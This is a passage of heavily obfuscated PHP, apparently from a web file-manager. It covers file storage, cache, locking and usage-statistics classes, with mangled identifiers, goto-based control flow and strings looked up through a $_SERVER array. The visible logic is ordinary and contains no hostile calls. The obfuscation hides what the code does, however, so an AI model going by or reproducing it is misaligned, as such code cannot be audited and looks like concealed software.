(@is_file($Dõº§ˆÕ¡ù)) { return !0; } } else { if (@is_dir($Dõº§ˆÕ¡ù . $Fî×Œ•çØ·[8])) { return !0; } } } closedir($eÙ—ÃØŞ×Ï); goto eìà¯†ÅØ; eìà¯†ÅØ: if ($eæ’š†­Ä) { return array($Fî×Œ•çØ·[191] => $C‹Ã‘Ëá‡×, $Fî×Œ•çØ·[192] => $fÕÊ‰²ğÑ); } return !1; goto EÒ§¼Ä®Ñ; BÍ¯‡«ß¡: if (!($eÙ—ÃØŞ×Ï = @opendir($E»ËÛ­òá))) { return !1; } $C‹Ã‘Ëá‡× = 0; $fÕÊ‰²ğÑ = 0; goto FÑ±ê„÷ªÓ; b¦¾¤¹ÔœË: $Fî×Œ•çØ· =& $_SERVER[í™]; $E»ËÛ­òá = $this->iconvSystem($E»ËÛ­òá); $E»ËÛ­òá = rtrim($E»ËÛ­òá, $Fî×Œ•çØ·[8]) . $Fî×Œ•çØ·[8]; goto BÍ¯‡«ß¡; EÒ§¼Ä®Ñ: } public function hashSimple($B· å½æÔÕ) { goto dê¶ø³¸œ“; C·öÎó: return md5($Fï«•Ã¬íË) . $D½ÈœŒø Œ; goto e†µéòÃ¼Ë; dòÒ“•ÏÕ‘: $D½ÈœŒø Œ = $this->size($B· å½æÔÕ); $DµÍˆŸ‡©› = 200; $Aßï‡­ÁŞ¶ = 50; goto E‚ï¯â†î¤; AêÛÀ‡Ì‘¢: fseek($eƒ£•ÉÕõ, $D½ÈœŒø Œ - $DµÍˆŸ‡©›); $Fï«•Ã¬íË .= fread($eƒ£•ÉÕõ, $DµÍˆŸ‡©›); fclose($eƒ£•ÉÕõ); goto C·öÎó; dê¶ø³¸œ“: $b´ç×­Ø×¦ =& $_SERVER[í™]; if (!$B· å½æÔÕ) { return md5($b´ç×­Ø×¦[33]); } $B· å½æÔÕ = $this->iconvSystem($B· å½æÔÕ); goto dòÒ“•ÏÕ‘; fÑšÆí°«À: $eƒ£•ÉÕõ = fopen($B· å½æÔÕ, $b´ç×­Ø×¦[1156]); if (!$eƒ£•ÉÕõ) { return $Fï«•Ã¬íË; } for ($e©«´É²Ÿç = 0; $e©«´É²Ÿç < $Aßï‡­ÁŞ¶; $e©«´É²Ÿç++) { fseek($eƒ£•ÉÕõ, $DÊ®Õ²¨ÌÄ * $e©«´É²Ÿç); $Fï«•Ã¬íË .= fread($eƒ£•ÉÕõ, $DµÍˆŸ‡©›); } goto AêÛÀ‡Ì‘¢; E‚ï¯â†î¤: if ($D½ÈœŒø Œ <= $DµÍˆŸ‡©› * $Aßï‡­ÁŞ¶) { return $this->hashMd5($B· å½æÔÕ) . $D½ÈœŒø Œ; } $Fï«•Ã¬íË = $b´ç×­Ø×¦[33]; $DÊ®Õ²¨ÌÄ = intval($D½ÈœŒø Œ / $Aßï‡­ÁŞ¶); goto fÑšÆí°«À; e†µéòÃ¼Ë: } public function getContent($f´÷ŞŠ¢¦) { $f´÷ŞŠ¢¦ = $this->iconvSystem($f´÷ŞŠ¢¦); return file_get_contents($f´÷ŞŠ¢¦); } public function setContent($fÓº§ëàÜƒ, $E¶ØÍö®ÏÁ = '') { $fÓº§ëàÜƒ = $this->iconvSystem($fÓº§ëàÜƒ); @file_put_contents($fÓº§ëàÜƒ, $E¶ØÍö®ÏÁ, LOCK_EX); clearstatcache(); return strlen($E¶ØÍö®ÏÁ) == filesize($fÓº§ëàÜƒ); } public function fileSubstr($FÜó±–·õÉ, $AÂÌßÙ™´‡ = 0, $D‚„²ùµ ç = false) { goto C«†º¹…ã¶; C«†º¹…ã¶: $CŠÂ¢‡¤‚È =& $_SERVER[í™]; $FÜó±–·õÉ = $this->iconvSystem($FÜó±–·õÉ); if ($D‚„²ùµ ç === !1) { $D‚„²ùµ ç = $this->size($FÜó±–·õÉ); } goto FŒÒ®´å¬î; E†½ÖàÊ§: return $b‘è”«ƒ¯÷; goto F÷³ë„ß‘æ; FŒÒ®´å¬î: if ($D‚„²ùµ ç <= 0) { return $CŠÂ¢‡¤‚È[33]; } $b´¥‰®Í›Á = fopen($FÜó±–·õÉ, $CŠÂ¢‡¤‚È[1156]); if (!$b´¥‰®Í›Á) { return !1; } goto eÊ«Ì•‘Óá; eÊ«Ì•‘Óá: fseek($b´¥‰®Í›Á, $AÂÌßÙ™´‡); $b‘è”«ƒ¯÷ = fread($b´¥‰®Í›Á, $D‚„²ùµ ç); fclose($b´¥‰®Í›Á); goto E†½ÖàÊ§; F÷³ë„ß‘æ: } public function upload($Eè™ƒëãÌÓ, $Bè¯èä¡, $F´°¸ĞÈ = false, $bœïÔË¨ª¾ = REPEAT_REPLACE) { $f¼â¸Ş–Ì = $this->copyFile($Bè¯èä¡, $Eè™ƒëãÌÓ); return $f¼â¸Ş–Ì ? $this->getPathOuter($Eè™ƒëãÌÓ) : !1; } public function setModifyTime($bËÆ–Àò‡Ù, $aŒæíËƒ = '') { @touch($bËÆ–Àò‡Ù, intval($aŒæíËƒ)); } public function download($b‘ºÎõ×‡, $aŒ§åä†Ö¨) { return $this->iconvSystem($b‘ºÎõ×‡); } } goto d­„÷Õ›”Ğ; FíŸí¸É–¨: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($E »ğ‹…¯Í, $f°Æ‡°Ÿİ) { $dùäóƒïó¡ =& $_SERVER[í™]; $this->cachePath = $E »ğ‹…¯Í[$dùäóƒïó¡[75]]; $this->prefix = $dùäóƒïó¡[750]; $this->cacheTime = $f°Æ‡°Ÿİ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($d¨åÒäİ¾) { $C‘·¬ƒÚ¨È =& $_SERVER[í™]; $d¨åÒäİ¾ = str_replace(array($C‘·¬ƒÚ¨È[751], $C‘·¬ƒÚ¨È[93], $C‘·¬ƒÚ¨È[69]), $C‘·¬ƒÚ¨È[752], $d¨åÒäİ¾); return $this->cachePath . $C‘·¬ƒÚ¨È[753] . $d¨åÒäİ¾ . $C‘·¬ƒÚ¨È[754]; } public function set($AƒóõœÄâ‘, $FÁ‹—‘ˆÑ, $EåĞ¶¼³¾ = false) { $E÷Š¬œ¹À = $this->getFile($AƒóõœÄâ‘); if (file_put_contents($E÷Š¬œ¹À, $this->prefix . $FÁ‹—‘ˆÑ, LOCK_EX)) { return !0; } @unlink($E÷Š¬œ¹À); return !1; } public function get($C‘¹ÔÇæ¢…) { $CÚ»ÒèËÜ = $this->getFile($C‘¹ÔÇæ¢…); if (file_exists($CÚ»ÒèËÜ) && filemtime($CÚ»ÒèËÜ) < time() - $this->cacheTime) { @unlink($CÚ»ÒèËÜ); return !1; } $aÇÍ£ÑíÉ = @file_get_contents($CÚ»ÒèËÜ); return substr($aÇÍ£ÑíÉ, strlen($this->prefix)); } public function remove($Aô³¦Ğ¯¨—) { $CëğàÃ±âØ = $this->getFile($Aô³¦Ğ¯¨—); return @unlink($CëğàÃ±âØ); } public function deleteAll() { $e¦¬÷ñÅÖì =& $_SERVER[í™]; $DãÙŸÛĞà = scandir($this->cachePath); foreach ($DãÙŸÛĞà as $DîåìÔšùõ) { $Eáá‘÷»ùÛ = $this->cachePath . $DîåìÔšùõ; if (strpos($Eáá‘÷»ùÛ, $e¦¬÷ñÅÖì[754]) && strpos($Eáá‘÷»ùÛ, $e¦¬÷ñÅÖì[755])) { @unlink($Eáá‘÷»ùÛ); } } } public function clearTimeout() { $B—¶˜ò»Õ =& $_SERVER[í™]; $Bë™êŞÕ‘¤ = scandir($this->cachePath); foreach ($Bë™êŞÕ‘¤ as $d¯Û’‚øòÀ) { $cƒø„—ë¹Ğ = $this->cachePath . $d¯Û’‚øòÀ; if (strpos($cƒø„—ë¹Ğ, $B—¶˜ò»Õ[754]) && strpos($cƒø„—ë¹Ğ, $B—¶˜ò»Õ[755]) && filemtime($cƒø„—ë¹Ğ) < time() - $this->cacheTime) { @unlink($cƒø„—ë¹Ğ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto cáòá³ÌÏÌ; cáòá³ÌÏÌ: $d¨Ÿø¢¶‹ =& $_SERVER[í™]; if (self::$handle) { return self::$handle; } $bÎÏ­Í = $GLOBALS[$d¨Ÿø¢¶‹[6]][$d¨Ÿø¢¶‹[337]]; goto d¿ÈÓ©‡ĞÖ; cìšñÇÀ¯¤: if ($e¯½ç³î† == $d¨Ÿø¢¶‹[17] && $F˜¸ù¾³Ï == $d¨Ÿø¢¶‹[9]) { $e¯½ç³î† = $d¨Ÿø¢¶‹[167]; } switch ($e¯½ç³î†) { case $d¨Ÿø¢¶‹[746]: self::$handle = new CacheLockRedis(); break; case $d¨Ÿø¢¶‹[747]: self::$handle = new CacheLockMemcached(); break; case $d¨Ÿø¢¶‹[17]: self::$handle = new CacheLockDatabase(); break; case $d¨Ÿø¢¶‹[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto A³È¯Œ³¨“; d¿ÈÓ©‡ĞÖ: self::$timeout = $bÎÏ­Í[$d¨Ÿø¢¶‹[756]] ? $bÎÏ­Í[$d¨Ÿø¢¶‹[756]] : 10; $F˜¸ù¾³Ï = _get($GLOBALS[$d¨Ÿø¢¶‹[6]], $d¨Ÿø¢¶‹[757]); $e¯½ç³î† = $bÎÏ­Í[$d¨Ÿø¢¶‹[743]] ? $bÎÏ­Í[$d¨Ÿø¢¶‹[743]] : $d¨Ÿø¢¶‹[167]; goto cìšñÇÀ¯¤; A³È¯Œ³¨“: } private static function key($cÄ©­÷×µ) { return $_SERVER[í™][758] . Cache::key($cÄ©­÷×µ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($f¢œÅĞÛªó = '') { self::$errorMsg = $f¢œÅĞÛªó; } public static function lockGlobal($cˆØÙ÷Ş£, $F©ô‡Ú®Œˆ) { return self::lock($cˆØÙ÷Ş£, $F©ô‡Ú®Œˆ, !0); } public static function lock($D“ï¿©÷ğ, $cË–¦ÄìªŞ = false, $BöáÚ·àâÙ = false) { goto d’¥õÀÄá¤; aÂÃŒÄµº: if (!$BöáÚ·àâÙ) { self::$lockItem[$f†ÏÒ”Š‡] = !0; } return $c÷´êÑØê©; goto cŞÁ„øº¼‡; d’¥õÀÄá¤: $ağÇœÆ¢Åò =& $_SERVER[í™]; $d÷À‰Á§À¡ = self::init(); $f†ÏÒ”Š‡ = self::key($D“ï¿©÷ğ); goto FÂÇà§¯¹; FÂÇà§¯¹: $cË–¦ÄìªŞ = $cË–¦ÄìªŞ ? $cË–¦ÄìªŞ : self::$timeout; $c÷´êÑØê© = $d÷À‰Á§À¡->lock($f†ÏÒ”Š‡, $cË–¦ÄìªŞ); if (!$c÷´êÑØê©) { $fËÊÚó Ì = $ağÇœÆ¢Åò[759] . $cË–¦ÄìªŞ . $ağÇœÆ¢Åò[67] . self::$errorMsg . $ağÇœÆ¢Åò[67] . get_caller_msg(); $d´µ±–çÊ© = "\x4c\157\x63\153\40\x61\143\x74\x69\x6f\x6e\72\40{$f†ÏÒ”Š‡}\x20\164\151\155\x65\157\x75\x74\54\x6f\x76\145\x72\40{$cË–¦ÄìªŞ}\40\x73"; $d´µ±–çÊ© = self::$errorMsg ? self::$errorMsg : $E…†àìãìº; write_log($fËÊÚó Ì, $ağÇœÆ¢Åò[760]); show_json($d´µ±–çÊ©, !1); } goto aÂÃŒÄµº; cŞÁ„øº¼‡: } public static function lockGet($b›ã‘­í¥´) { $a†İ­šµãÒ = self::key($b›ã‘­í¥´); if (self::$lockItem[$a†İ­šµãÒ]) { return self::$lockItem[$a†İ­šµãÒ]; } return self::init()->lockGet($a†İ­šµãÒ); } public static function unlock($a–¸Şí‹ğË) { $Bêç¢Š¸¢ = self::key($a–¸Şí‹ğË); self::$lockItem[$Bêç¢Š¸¢] = null; return self::init()->unlock($Bêç¢Š¸¢); } public static function unlockRuntime() { $b¦çóé¿‘Å =& $_SERVER[í™]; $BÕ„â†¥— = self::init(); $B´‡Ê¬§¿¦ = !1; foreach (self::$lockItem as $E‰§˜¼Ò‘â => $f¦–¸“Ù¶’) { if (!$f¦–¸“Ù¶’) { continue; } $BÕ„â†¥—->unlock($E‰§˜¼Ò‘â); if (!$B´‡Ê¬§¿¦) { $B´‡Ê¬§¿¦ = !0; write_log($b¦çóé¿‘Å[761] . $E‰§˜¼Ò‘â . $b¦çóé¿‘Å[67] . get_caller_msg(), $b¦çóé¿‘Å[760]); continue; } write_log($b¦çóé¿‘Å[761] . $E‰§˜¼Ò‘â, $b¦çóé¿‘Å[760]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto e‘£ÅáÒ„Í; f³óÏÌİ±î: class AnalysisModel extends ModelBaseLight { public function init($BªÏÛ—ï†Û) { $B™‚‹Ô =& $_SERVER[í™]; $f÷ŸÃâ³Ûõ = array($B™‚‹Ô[537] => array($B™‚‹Ô[29] => $B™‚‹Ô[2019], $B™‚‹Ô[261] => array($B™‚‹Ô[210], $B™‚‹Ô[682], $B™‚‹Ô[2020], $B™‚‹Ô[2021])), $B™‚‹Ô[2022] => array($B™‚‹Ô[29] => $B™‚‹Ô[2023], $B™‚‹Ô[261] => array($B™‚‹Ô[210], $B™‚‹Ô[680], $B™‚‹Ô[2024], $B™‚‹Ô[2025], $B™‚‹Ô[2026]))); if (!isset($f÷ŸÃâ³Ûõ[$BªÏÛ—ï†Û])) { return !1; } $this->optionType = $f÷ŸÃâ³Ûõ[$BªÏÛ—ï†Û][$B™‚‹Ô[29]]; $this->field = $f÷ŸÃâ³Ûõ[$BªÏÛ—ï†Û][$B™‚‹Ô[261]]; return !0; } public function listData($B¿×ÚÛ©öÉ = false, $c¸İ¶ ­² = "\x6d\x6f\144\x69\x66\171\x54\151\x6d\x65", $Cİìõ­á» = false) { return parent::listData($B¿×ÚÛ©öÉ, $c¸İ¶ ­², $Cİìõ­á»); } public function trendList($cÊ„Åâìä¥) { goto fŒâ÷ù•ñ; Cíõò‡Ñíè: foreach ($a˜®„¥šŠÍ as $bìÏÒ‰Šñ) { $this->{$e…š ã©ÖÀ}($bìÏÒ‰Šñ); } return $this->listData(); goto D½«Á®øŞ; fŒâ÷ù•ñ: $f‰À†‰¯Ù =& $_SERVER[í™]; $D®ù•†½ = $this->listData(); if ($D®ù•†½) { $aÇ¨‹¥—Š = end($D®ù•†½); $bìÏÒ‰Šñ = date($f‰À†‰¯Ù[2027], strtotime($f‰À†‰¯Ù[2028])); if ($aÇ¨‹¥—Š[$f‰À†‰¯Ù[210]] == $bìÏÒ‰Šñ) { return $D®ù•†½; } $bğ‹–¬±Ô = strtotime($aÇ¨‹¥—Š[$f‰À†‰¯Ù[210]]); } goto C´â¤Ò‰ˆ‹; C´â¤Ò‰ˆ‹: if (!isset($bğ‹–¬±Ô)) { $A×ŒÌÔ’Œä = $cÊ„Åâìä¥ == $f‰À†‰¯Ù[537] ? $f‰À†‰¯Ù[479] : $f‰À†‰¯Ù[734]; $bğ‹–¬±Ô = Model($A×ŒÌÔ’Œä)->min($f‰À†‰¯Ù[187]); } $e…š ã©ÖÀ = $f‰À†‰¯Ù[2029] . ucfirst($cÊ„Åâìä¥); $a˜®„¥šŠÍ = $this->dateList($bğ‹–¬±Ô); goto Cíõò‡Ñíè; D½«Á®øŞ: } private function dateList($C—àœ¢Ù÷) { $C®¦¨ß„¥ =& $_SERVER[í™]; $dĞ“Ü´Ó = $C—àœ¢Ù÷; $BƒÌ·Å¹Ø = strtotime($C®¦¨ß„¥[2028]); $A¾Âô©ãƒ = array(); while ($dĞ“Ü´Ó <= $BƒÌ·Å¹Ø) { $A¾Âô©ãƒ[] = date($C®¦¨ß„¥[2027], $dĞ“Ü´Ó); $dĞ“Ü´Ó = strtotime($C®¦¨ß„¥[2030], $dĞ“Ü´Ó); } return $A¾Âô©ãƒ; } public function _recordUser($b¢âÛïÁöˆ = '') { goto dÄ„±³–Á; bÕ¼ò”ŠÈã: $Fåî®Èëƒ = Model($EèğÚƒÇ”[479])->where($Eß°„¿ñÅ‡)->count($EèğÚƒÇ”[1423]); $Eß°„¿ñÅ‡[$EèğÚƒÇ”[29]] = $EèğÚƒÇ”[2033]; $C‰˜ëƒà‚ñ = Model($EèğÚƒÇ”[2034])->where($Eß°„¿ñÅ‡)->count($EèğÚƒÇ”[2035]); goto AÀÏŠ‰Ğ; aÑŞ°©¸Ö: $Eß°„¿ñÅ‡ = array($EèğÚƒÇ”[187] => array($EèğÚƒÇ”[912], $b™×†™Œ½š)); $aÅÌĞŒ…Ù = Model($EèğÚƒÇ”[479])->where($Eß°„¿ñÅ‡)->count($EèğÚƒÇ”[1423]); $Eß°„¿ñÅ‡[$EèğÚƒÇ”[187]] = array($EèğÚƒÇ”[321], array($eÚïÉäÄï, $b™×†™Œ½š)); goto bÕ¼ò”ŠÈã; AÀÏŠ‰Ğ: $A¾»çÆÜôï = array($EèğÚƒÇ”[210] => $b¢âÛïÁöˆ, $EèğÚƒÇ”[682] => (int) $aÅÌĞŒ…Ù, $EèğÚƒÇ”[2020] => (int) $Fåî®Èëƒ, $EèğÚƒÇ”[2021] => (int) $C‰˜ëƒà‚ñ); return $this->insert($A¾»çÆÜôï); goto AšÌ‹ÔÁÇ; dÄ„±³–Á: $EèğÚƒÇ” =& $_SERVER[í™]; $eÚïÉäÄï = strtotime(date($EèğÚƒÇ”[2031], strtotime($b¢âÛïÁöˆ))); $b™×†™Œ½š = strtotime(date($EèğÚƒÇ”[2032], strtotime($b¢âÛïÁöˆ))); goto aÑŞ°©¸Ö; AšÌ‹ÔÁÇ: } public function _recordStore($f§Ø›Å—ï” = '') { goto Bº–ë¸î‡å; CÒ‹Ç‡»Å‰: $d‘æÌâÍĞ[$bñÆ›‚”Ò‡[371]] = 1; $bŠ¬±¥Œâ‰ = Model($bñÆ›‚”Ò‡[734])->where($d‘æÌâÍĞ)->sum($bñÆ›‚”Ò‡[77]); $d‘æÌâÍĞ[$bñÆ›‚”Ò‡[371]] = 2; goto a‰óêÙ‡õ´; bÑŒØ¸‹: $b–†œ°Í = Model($bñÆ›‚”Ò‡[422])->where($d‘æÌâÍĞ)->sum($bñÆ›‚”Ò‡[77]); $d‘æÌâÍĞ[$bñÆ›‚”Ò‡[370]] = 0; $D±×‡¡Ô• = Model($bñÆ›‚”Ò‡[734])->where($d‘æÌâÍĞ)->sum($bñÆ›‚”Ò‡[77]); goto CÒ‹Ç‡»Å‰; Bº–ë¸î‡å: $bñÆ›‚”Ò‡ =& $_SERVER[í™]; $cãÕÓÛ¾À· = strtotime(date($bñÆ›‚”Ò‡[2032], strtotime($f§Ø›Å—ï”))); $d‘æÌâÍĞ = array($bñÆ›‚”Ò‡[187] => array($bñÆ›‚”Ò‡[912], $cãÕÓÛ¾À·)); goto bÑŒØ¸‹; a‰óêÙ‡õ´: $cÔÅâøƒ‰ = Model($bñÆ›‚”Ò‡[734])->where($d‘æÌâÍĞ)->sum($bñÆ›‚”Ò‡[77]); $DêğÊ¯¥Ó› = array($bñÆ›‚”Ò‡[210] => $f§Ø›Å—ï”, $bñÆ›‚”Ò‡[680] => (int) $D±×‡¡Ô•, $bñÆ›‚”Ò‡[2024] => (int) $b–†œ°Í, $bñÆ›‚”Ò‡[2025] => (int) $bŠ¬±¥Œâ‰, $bñÆ›‚”Ò‡[2026] => (int) $cÔÅâøƒ‰); return $this->insert($DêğÊ¯¥Ó›); goto EÜ³ŒŒ¥÷; EÜ³ŒŒ¥÷: } public function trend($E­½Åšâäó, $e•Œî–„¥Ò) { goto føµğš¹…ë; føµğš¹…ë: $d±ó‰òÂå =& $_SERVER[í™]; if (!$this->init($E­½Åšâäó)) { return !1; } $b­‹É³Õ¹£ = $this->trendList($E­½Åšâäó); goto aàÉç­”Ó; E©ù·“î–·: if (empty($b­‹É³Õ¹£)) { $fêªáÜ„Š = date($d±ó‰òÂå[2027], strtotime($d±ó‰òÂå[2028])); $fºØˆˆœ™¡ = array($d±ó‰òÂå[210] => $fêªáÜ„Š); foreach ($cÆŸãôßÌ[$E­½Åšâäó] as $d¶¦Ñõ³ø => $a¤ø×ß¡œ) { $fºØˆˆœ™¡[$d¶¦Ñõ³ø] = 0; } $b­‹É³Õ¹£[] = $fºØˆˆœ™¡; } $d²‹ß‰‹ƒå = array(); foreach ($b­‹É³Õ¹£ as $a¤ø×ß¡œ) { if ($E­½Åšâäó == $d±ó‰òÂå[2022] && $a¤ø×ß¡œ[$d±ó‰òÂå[2024]] > $a¤ø×ß¡œ[$d±ó‰òÂå[680]]) { $a¤ø×ß¡œ[$d±ó‰òÂå[2024]] = $a¤ø×ß¡œ[$d±ó‰òÂå[680]]; } foreach ($cÆŸãôßÌ[$E­½Åšâäó] as $d¶¦Ñõ³ø => $aáë‰Ôø«) { $cÒğÛ¼ß“Ê = array($d±ó‰òÂå[210] => $a¤ø×ß¡œ[$d±ó‰òÂå[210]], $d±ó‰òÂå[1328] => $aáë‰Ôø«); $cÒğÛ¼ß“Ê[$aëŸ‘Î±ÉÃ[$E­½Åšâäó]] = isset($a¤ø×ß¡œ[$d¶¦Ñõ³ø]) ? $a¤ø×ß¡œ[$d¶¦Ñõ³ø] : 0; $d²‹ß‰‹ƒå[] = $cÒğÛ¼ß“Ê; } } goto B¡¶÷ÔÒ“™; aàÉç­”Ó: if ($b­‹É³Õ¹£ && $e•Œî–„¥Ò != $d±ó‰òÂå[1398]) { $c¥”´­²¸­ = $b­‹É³Õ¹£[0][$d±ó‰òÂå[210]]; $b°ÙÌĞº£™ = $this->validDate($e•Œî–„¥Ò, $c¥”´­²¸­); $E­¡‚Ğ¡‰Ş = array(); $F×Ûƒ…×±² = array_to_keyvalue($b­‹É³Õ¹£, $d±ó‰òÂå[210]); foreach ($b°ÙÌĞº£™ as $fêªáÜ„Š) { if (isset($F×Ûƒ…×±²[$fêªáÜ„Š])) { $cÒğÛ¼ß“Ê = $F×Ûƒ…×±²[$fêªáÜ„Š]; } else { $cÒğÛ¼ß“Ê = end($b­‹É³Õ¹£); $cÒğÛ¼ß“Ê[$d±ó‰òÂå[210]] = $fêªáÜ„Š; if ($E­½Åšâäó == $d±ó‰òÂå[537]) { $cÒğÛ¼ß“Ê[$d±ó‰òÂå[2020]] = $cÒğÛ¼ß“Ê[$d±ó‰òÂå[2021]] = 0; } } $E­¡‚Ğ¡‰Ş[] = $cÒğÛ¼ß“Ê; } $b­‹É³Õ¹£ = $E­¡‚Ğ¡‰Ş; } $cÆŸãôßÌ = array($d±ó‰òÂå[537] => array($d±ó‰òÂå[682] => LNG($d±ó‰òÂå[2036]), $d±ó‰òÂå[2020] => LNG($d±ó‰òÂå[2037]), $d±ó‰òÂå[2021] => LNG($d±ó‰òÂå[2038])), $d±ó‰òÂå[2022] => array($d±ó‰òÂå[680] => LNG($d±ó‰òÂå[2039]), $d±ó‰òÂå[2024] => LNG($d±ó‰òÂå[2040]), $d±ó‰òÂå[2025] => LNG($d±ó‰òÂå[2041]), $d±ó‰òÂå[2026] => LNG($d±ó‰òÂå[2042]))); $aëŸ‘Î±ÉÃ = array($d±ó‰òÂå[537] => $d±ó‰òÂå[2043], $d±ó‰òÂå[2022] => $d±ó‰òÂå[77]); goto E©ù·“î–·; B¡¶÷ÔÒ“™: return $d²‹ß‰‹ƒå; goto Aç‚®ÛÍ ; Aç‚®ÛÍ : } public function validDate($b¤¬‰ÁÚÆƒ, $eœˆ¿¡¢§) { goto bÉÆˆÓÚñÉ; bÉÆˆÓÚñÉ: $bØõ¸´™ =& $_SERVER[í™]; $d—§“Š ›ˆ = date($bØõ¸´™[2027], strtotime($bØõ¸´™[2028])); $aåå”­Å† = array($d—§“Š ›ˆ); goto EñØ ­ï°©; aÍÃ’‚à‘ê: return $aåå”­Å†; goto CÏ¦áÕê¾; EñØ ­ï°©: switch ($b¤¬‰ÁÚÆƒ) { case $bØõ¸´™[1405]: $e œŸ»î¬¸ = mktime(0, 0, 0, date($bØõ¸´™[2044]), date($bØõ¸´™[2045]) - date($bØõ¸´™[1212]) + 7 - 7, date($bØõ¸´™[2046])); $EƒÏ§İùğŒ = 0; do { $F¹ƒ×„™Â± = date($bØõ¸´™[2027], $e œŸ»î¬¸ - 3600 * 24 * 7 * $EƒÏ§İùğŒ); $aåå”­Å†[] = $F¹ƒ×„™Â±; $EƒÏ§İùğŒ++; } while ($eœˆ¿¡¢§ < $F¹ƒ×„™Â±); break; case $bØõ¸´™[1403]: $EƒÏ§İùğŒ = 1; do { $CÒçˆ²‰£¦ = date($bØõ¸´™[2047], strtotime("\55\40{$EƒÏ§İùğŒ}\x20\155\157\156\x74\150\x73")); $aåå”­Å†[] = $CÒçˆ²‰£¦; $EƒÏ§İùğŒ++; } while ($eœˆ¿¡¢§ < $CÒçˆ²‰£¦); break; case $bØõ¸´™[1712]: $cø¿”ÙÓáŒ = (int) date($bØõ¸´™[2046], strtotime($eœˆ¿¡¢§)); $a‹…’…ì±” = (int) date($bØõ¸´™[2046]); if ($cø¿”ÙÓáŒ >= $a‹…’…ì±”) { break; } for ($cø¿”ÙÓáŒ; $cø¿”ÙÓáŒ < $a‹…’…ì±”; $cø¿”ÙÓáŒ++) { $aåå”­Å†[] = $cø¿”ÙÓáŒ . $bØõ¸´™[2048]; } break; default: break; } if ($eœˆ¿¡¢§ > end($aåå”­Å†)) { array_pop($aåå”­Å†); } sort($aåå”­Å†); goto aÍÃ’‚à‘ê; CÏ¦áÕê¾: } public function listTable($dî©ÉğÒåÇ) { $aôÑ×ß²ìì = ucfirst($dî©ÉğÒåÇ); return Model($aôÑ×ß²ìì)->listData(); } public function option($aæĞŸÔœì) { $f¢œ’‚™¸© = $_SERVER[í™][2049] . ucfirst($aæĞŸÔœì); return $this->{$f¢œ’‚™¸©}(); } private function optionUser() { goto fîÚ„âò±Ú; CÇƒšÚñ ô: if (!$e¡ƒ³Á›º) { $e¡ƒ³Á›º = 1; } $cŸ‹ö«Š¬ = strtotime(date($e‚Ò®©ÏÃ¨[2031])); $DÏÙ‰ªØ¾› = array($e‚Ò®©ÏÃ¨[2052] => array($e‚Ò®©ÏÃ¨[913], $cŸ‹ö«Š¬)); goto b¡øö£ØÙØ; b¡øö£ØÙØ: $a‡¬“¦Ë²¯ = Model($e‚Ò®©ÏÃ¨[479])->where($DÏÙ‰ªØ¾›)->count($e‚Ò®©ÏÃ¨[1423]); return array($e‚Ò®©ÏÃ¨[677] => (int) $F´¶‰Ü³¸’, $e‚Ò®©ÏÃ¨[2053] => (int) ($F´¶‰Ü³¸’ - $bãŠ‘ÁÉ›), $e‚Ò®©ÏÃ¨[2054] => (int) $bãŠ‘ÁÉ›, $e‚Ò®©ÏÃ¨[2055] => (int) $a‡¬“¦Ë²¯, $e‚Ò®©ÏÃ¨[2056] => $e¡ƒ³Á›º); goto DÕ©âÕ¿»Á; fîÚ„âò±Ú: $e‚Ò®©ÏÃ¨ =& $_SERVER[í™]; $F´¶‰Ü³¸’ = Model($e‚Ò®©ÏÃ¨[479])->count($e‚Ò®©ÏÃ¨[1423]); $bãŠ‘ÁÉ› = Model($e‚Ò®©ÏÃ¨[479])->where($e‚Ò®©ÏÃ¨[2050])->count($e‚Ò®©ÏÃ¨[1423]); goto f‡õ˜õù…·; f‡õ˜õù…·: $cŸ‹ö«Š¬ = strtotime($e‚Ò®©ÏÃ¨[2051]); $DÏÙ‰ªØ¾› = array($e‚Ò®©ÏÃ¨[2052] => array($e‚Ò®©ÏÃ¨[913], $cŸ‹ö«Š¬)); $e¡ƒ³Á›º = (int) Model($e‚Ò®©ÏÃ¨[479])->where($DÏÙ‰ªØ¾›)->count($e‚Ò®©ÏÃ¨[1423]); goto CÇƒšÚñ ô; DÕ©âÕ¿»Á: } private function optionFile() { goto D®¢°ãĞÎ; D®¢°ãĞÎ: $DñÜëÈîø¬ =& $_SERVER[í™]; $E–Ú•›«ë£ = $this->sourceSize(); $cÈØİÀ‡İ = $E–Ú•›«ë£[$DñÜëÈîø¬[77]]; goto C®î‘ÍìÓ–; e¥ŒæÁõßí: $aïŒó¾‹­ = Model($DñÜëÈîø¬[734])->where($E“‹­à³†½)->sum($DñÜëÈîø¬[77]); $aˆåõ…“±˜ = Model($DñÜëÈîø¬[734])->where($E“‹­à³†½)->count($DñÜëÈîø¬[369]); return array($DñÜëÈîø¬[680] => $cÈØİÀ‡İ, $DñÜëÈîø¬[2024] => $e„¯ß×¨Û, $DñÜëÈîø¬[2057] => $cÈØİÀ‡İ - $e„¯ß×¨Û, $DñÜëÈîø¬[2058] => (int) $aïŒó¾‹­, $DñÜëÈîø¬[682] => (int) $b—‡äÜ‘¡Ù, $DñÜëÈîø¬[2059] => (int) $aˆåõ…“±˜); goto dñĞöŠ‰¢ù; C®î‘ÍìÓ–: $e„¯ß×¨Û = $E–Ú•›«ë£[$DñÜëÈîø¬[2024]]; $b—‡äÜ‘¡Ù = Model($DñÜëÈîø¬[734])->where(array($DñÜëÈîø¬[370] => 0))->count($DñÜëÈîø¬[369]); $E“‹­à³†½ = array($DñÜëÈîø¬[370] => 0, $DñÜëÈîø¬[187] => array($DñÜëÈîø¬[913], strtotime(date($DñÜëÈîø¬[2031])))); goto e¥ŒæÁõßí; dñĞöŠ‰¢ù: } private function optionAccess() { $fé‹›ô¦¿ò =& $_SERVER[í™]; return array($fé‹›ô¦¿ò[677] => $this->typeLogCnt(), $fé‹›ô¦¿ò[103] => $this->typeLogCnt($fé‹›ô¦¿ò[103]), $fé‹›ô¦¿ò[404] => $this->typeLogCnt($fé‹›ô¦¿ò[404]), $fé‹›ô¦¿ò[2060] => $this->typeLogCnt($fé‹›ô¦¿ò[2060]), $fé‹›ô¦¿ò[2061] => $this->typeLogCnt($fé‹›ô¦¿ò[2061]), $fé‹›ô¦¿ò[537] => 